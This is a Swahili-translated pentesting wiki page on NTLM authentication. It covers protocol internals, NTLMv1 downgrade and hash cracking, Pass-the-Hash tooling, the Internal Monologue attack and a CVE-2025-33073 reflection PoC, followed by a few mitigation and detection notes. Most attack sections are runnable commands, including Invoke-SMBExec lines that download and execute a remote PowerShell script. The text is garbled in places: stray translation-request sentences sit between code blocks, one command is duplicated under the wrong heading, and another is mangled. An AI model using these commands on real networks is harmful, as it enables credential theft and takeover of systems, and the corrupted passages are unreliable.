# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Maelezo ya Msingi

Katika mazingira ambako **Windows XP na Server 2003** zinafanya kazi, hashes za LM (Lan Manager) hutumika, ingawa inatambulika kwa upana kuwa zinaweza ku-compromise kwa urahisi. LM hash maalum, `AAD3B435B51404EEAAD3B435B51404EE`, huashiria hali ambapo LM haitumiki, na inawakilisha hash ya string tupu.

Kwa chaguo-msingi, protocol ya authentication ya **Kerberos** ndiyo njia kuu inayotumika. NTLM (NT LAN Manager) huanza kutumika katika hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa domain, Kerberos kutofanya kazi kwa sababu ya configuration isiyo sahihi, au wakati connections zinapojaribiwa kwa kutumia IP address badala ya hostname halali.

Uwepo wa header ya **"NTLMSSP"** kwenye network packets huashiria mchakato wa NTLM authentication.

Support kwa authentication protocols - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyoko kwenye `%windir%\Windows\System32\msv1\_0.dll`.

**Mambo Muhimu**:

- LM hashes ziko katika hatari, na LM hash tupu (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kwamba haitumiki.
- Kerberos ndiyo authentication method ya chaguo-msingi, huku NTLM ikitumika tu katika hali fulani.
- NTLM authentication packets hutambulika kwa header ya "NTLMSSP".
- LM, NTLMv1, na NTLMv2 protocols zinaungwa mkono na system file `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kusanidi ni protocol ipi itatumika:

### GUI

Tekeleza _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Kuna levels 6 (kutoka 0 hadi 5).

![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Kuna levels 6 (kutoka 0 hadi 5)](<../../images/image (919).png>)

### Registry

Hii itaweka level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Thamani zinazowezekana:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Mpangilio wa msingi wa authentication ya NTLM Domain

1. **user** anaingiza **credentials** zake
2. Mashine ya client **inatuma ombi la authentication** ikituma **jina la domain** na **username**
3. **server** inatuma **challenge**
4. **client inafanya encryption** ya **challenge** kwa kutumia hash ya password kama key na kuituma kama response
5. **server inatuma** kwa **Domain controller** **jina la domain, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au jina la domain ni jina la server, credentials **hukaguliwa locally**.
6. **domain controller hukagua ikiwa kila kitu kiko sahihi** na kutuma taarifa kwa server

**server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa sababu Domain Controller inajua password ya server (iko ndani ya db ya **NTDS.DIT**).

### Mpangilio wa authentication ya Local NTLM

Authentication hufanyika kama ilivyotajwa **hapo awali, lakini** **server** inajua **hash ya user** anayejaribu kufanya authentication ndani ya file la **SAM**. Kwa hiyo, badala ya kuuliza Domain Controller, **server itajikagua yenyewe** ili kuona ikiwa user anaweza kufanya authentication.

### NTLMv1 Challenge

**urefu wa challenge ni bytes 8** na **response ina urefu wa bytes 24**.

**NT hash (16bytes)** inagawanywa katika **sehemu 3 zenye 7bytes kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa zeros**. Kisha, **challenge** inafanyiwa **ciphering** kando kwa kila sehemu na bytes za **cipher** **zinazopatikana huunganishwa**. Jumla: 8B + 8B + 8B = 24Bytes.

**Matatizo**:

- Ukosefu wa **randomness**
- Sehemu 3 zinaweza **kushambuliwa kando** ili kupata NT hash
- **DES inaweza kuvunjwa**
- Key ya 3º huwa imeundwa na **zeros 5**.
- Kwa kupewa **challenge ile ile**, **response** itakuwa **ile ile**. Kwa hiyo, unaweza kumpa victim string "**1122334455667788**" kama **challenge** na kushambulia response kwa kutumia **precomputed rainbow tables**.

### NTLMv1 attack

Siku hizi inazidi kuwa vigumu kupata environments zilizo na Unconstrained Delegation iliyosanidiwa, lakini hii haimaanishi kwamba huwezi **kutumia vibaya service ya Print Spooler** iliyosanidiwa.

Unaweza kutumia vibaya credentials/sessions ulizo nazo tayari kwenye AD ili **kuomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka challenge ya authentication kuwa 1122334455667788**, kunasa jaribio la authentication, na ikiwa lilifanywa kwa kutumia **NTLMv1**, utaweza **kuivunja**.\
Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag `--lm`** ili kujaribu **kushusha kiwango** cha **authentication**.\
_Note kwamba kwa technique hii authentication lazima ifanywe kwa kutumia NTLMv1 (NTLMv2 si sahihi)._

Kumbuka kwamba printer itatumia computer account wakati wa authentication, na computer accounts hutumia passwords **ndefu na za random** ambazo **huenda usiweze kuzivunja** kwa kutumia **dictionaries** za kawaida. Lakini authentication ya **NTLMv1** **inatumia DES** ([maelezo zaidi hapa](#ntlmv1-challenge)), kwa hiyo kwa kutumia services maalum zilizotengwa kwa ajili ya kuvunja DES utaweza kuivunja (kwa mfano unaweza kutumia [https://crack.sh/](https://crack.sh/) au [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 pia inaweza kuvunjwa kwa kutumia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), ambayo hu-format messages za NTLMv1 kwa method inayoweza kuvunjwa kwa kutumia hashcat.<sup>[[1]](#references)</sup>

Command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the English content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Endesha hashcat (ni bora kuisambaza kupitia tool kama hashtopolis), kwa kuwa vinginevyo itachukua siku kadhaa.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika hali hii tunajua kwamba nenosiri la hii ni password, kwa hivyo tutadanganya kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sasa tunahitaji kutumia hashcat-utilities kubadilisha funguo za des zilizopasuliwa kuwa sehemu za NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Tafadhali tuma sehemu ya mwisho unayotaka itafsiriwe.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text or files you want combined and translated into Swahili.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Urefu wa challenge ni baiti 8** na **majibu 2 yanatumwa**: Moja lina urefu wa **baiti 24** na urefu wa **jingine** ni **wa kubadilika**.

**Jibu la kwanza** linaundwa kwa ku-cipher kwa kutumia **HMAC_MD5** **string** inayoundwa na **client na domain**, na kutumia kama **key** **hash MD4** ya **NT hash**. Kisha, **matokeo** yanatumika kama **key** ku-cipher kwa kutumia **HMAC_MD5** **challenge**. Kwa hili, **client challenge ya baiti 8** inaongezwa. Jumla: 24 B.

**Jibu la pili** linaundwa kwa kutumia **thamani kadhaa** (client challenge mpya, **timestamp** ili kuzuia **replay attacks**...)

Ikiwa una **pcap iliyonasa mchakato wa uthibitishaji uliofanikiwa**, unaweza kufuata mwongozo huu ili kupata domain, username, challenge na response, kisha ujaribu kuvunja password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kujiwakilisha kama yeye**.\
Unahitaji kutumia **tool** ambayo **itafanya** **NTLM authentication kwa kutumia** hiyo **hash**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hiyo **hash** ndani ya **LSASS**, ili wakati **NTLM authentication inapofanywa**, **hash hiyo itumike.** Chaguo la mwisho ndilo mimikatz hufanya.

**Tafadhali kumbuka kuwa unaweza kufanya mashambulizi ya Pass-the-Hash pia kwa kutumia Computer accounts.**

### **Mimikatz**

**Inahitaji kuendeshwa kama administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hii itazindua mchakato ambao utakuwa wa watumiaji ambao wamezindua mimikatz, lakini ndani ya LSASS credentials zilizohifadhiwa ni zile zilizo ndani ya parameters za mimikatz. Kisha, unaweza kufikia rasilimali za mtandao kana kwamba wewe ni huyo mtumiaji (sawa na mbinu ya `runas /netonly`, lakini huhitaji kujua password ya plain-text).

### Pass-the-Hash kutoka Linux

Unaweza kupata code execution kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
[**Fikia hapa ili kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Unaweza kupakua[ impacket binaries za Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Katika hali hii unahitaji kubainisha command, cmd.exe na powershell.exe si halali kupata interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Kuna Impacket binaries nyingine kadhaa...

### Invoke-TheHash

Unaweza kupata powershell scripts hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Function hii ni **mchanganyiko wa nyingine zote**. Unaweza kupitisha **hosts kadhaa**, **kuwatenga baadhi** na **kuchagua** **option** unayotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ukichagua **SMBExec** au **WMIExec** lakini **usipotoa** parameter ya _**Command**_, ita **check** tu ikiwa una **permissions za kutosha**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Inahitaji kuendeshwa kama administrator**

Tool hii itafanya jambo lilelile kama mimikatz (modify LSASS memory).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Utekelezaji wa mbali wa Windows kwa mikono kwa kutumia username na password


{{#ref}}
../lateral-movement/
{{#endref}}

## Kuchota credentials kutoka kwenye Windows Host

**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata credentials kutoka kwenye Windows host soma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack ni mbinu fiche ya kuchota credentials inayomwezesha mshambuliaji kupata NTLM hashes kutoka kwenye mashine ya mwathiriwa **bila kuingiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye memory na mara nyingi huzuiwa na endpoint security solutions au Credential Guard, attack hii hutumia **local calls kwenda kwenye NTLM authentication package (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza mshambuliaji **hushusha mipangilio ya NTLM** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha hujifanya kuwa user tokens zilizopo zinazopatikana kutoka kwenye running processes na kuanzisha NTLM authentication locally ili kutengeneza majibu ya NetNTLMv1 kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>

Baada ya kunasa majibu haya ya NetNTLMv1, mshambuliaji anaweza kurejesha kwa haraka NTLM hashes za awali kwa kutumia **precomputed rainbow tables**, na hivyo kuwezesha Pass-the-Hash attacks zaidi kwa ajili ya lateral movement. Muhimu zaidi, Internal Monologue Attack hubaki fiche kwa sababu haitengenezi network traffic, haingizi code, wala kuanzisha memory dumps za moja kwa moja; hivyo ni vigumu zaidi kwa defenders kuigundua ikilinganishwa na mbinu za kawaida kama Mimikatz.

Ikiwa NetNTLMv1 haikubaliki—kwa sababu ya security policies zilizolazimishwa—mshambuliaji anaweza kushindwa kupata jibu la NetNTLMv1.

Ili kushughulikia hali hii, Internal Monologue tool ilisasishwa: Hupata server token dynamically kwa kutumia `AcceptSecurityContext()` ili bado **kunasa majibu ya NetNTLMv2** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi ku-crack, bado hufungua njia kwa relay attacks au offline brute-force katika hali chache.

PoC inaweza kupatikana kwenye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay na Responder

**Soma mwongozo wa kina zaidi kuhusu jinsi ya kutekeleza attacks hizo hapa:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Kuchanganua NTLM challenges kutoka kwenye network capture

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM na Kerberos *Reflection* kupitia Serialized SPNs (CVE-2025-33073)

Windows ina mitigations kadhaa zinazojaribu kuzuia *reflection* attacks ambapo NTLM (au Kerberos) authentication inayotoka kwenye host inarelayiwa kurudi kwenye **host hiyohiyo** ili kupata SYSTEM privileges.

Microsoft ilivunja public chains nyingi kupitia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na patches za baadaye, hata hivyo **CVE-2025-33073** inaonyesha kuwa protections bado zinaweza kuepukwa kwa kutumia vibaya jinsi **SMB client inavyopunguza Service Principal Names (SPNs)** zilizo na *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR ya bug
1. Mshambuliaji anasajili **DNS A-record** ambayo label yake ina-encode marshalled SPN – kwa mfano:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Mwathiriwa analazimishwa ku-authenticate kwenda kwenye hostname hiyo (PetitPotam, DFSCoerce, n.k.).
3. SMB client inapopitisha target string `cifs/srv11UWhRCAAAAA…` kwenda kwa `lsasrv!LsapCheckMarshalledTargetInfo`, call ya `CredUnmarshalTargetInfo` **huondoa** serialized blob, na kuacha **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (au Kerberos equivalent) sasa huchukulia target kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na computer name (`SRV1`).
5. Kwa sababu hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuingiza **LSASS’ SYSTEM access-token** kwenye context (kwa Kerberos huundwa subsession key yenye alama ya SYSTEM).
6. Kurelay authentication hiyo kwa `ntlmrelayx.py` **au** `krbrelayx.py` kunatoa SYSTEM rights kamili kwenye host hiyohiyo.<sup>[[5]](#references)</sup>

### PoC ya haraka
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Viraka na Mikakati ya Kupunguza Hatari
* Kiraka cha KB cha **CVE-2025-33073** kinaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao lengwa lake lina taarifa zilizomarshallowa (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Tekeleza **SMB signing** ili kuzuia reflection hata kwenye hosts ambazo hazijafanyiwa patch.
* Fuatilia rekodi za DNS zinazofanana na `*<base64>...*` na zuia coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Mawazo ya Ugunduzi
* Network captures zenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo IP ya client ≠ IP ya server.
* Kerberos AP-REQ iliyo na subsession key na client principal iliyo sawa na hostname.
* Windows Event 4624/4648 SYSTEM logons zinazofuatwa mara moja na remote SMB writes kutoka kwenye host hiyo hiyo.<sup>[[5]](#references)</sup>

Kwa **March 2026** local reflection variant inayotumia vibaya **SMB arbitrary ports** na **TCP connection reuse** kufikia `NT AUTHORITY\SYSTEM`, tazama:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Marejeo
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Kuvunja NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Kupata NTLM Hashes bila Kugusa LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
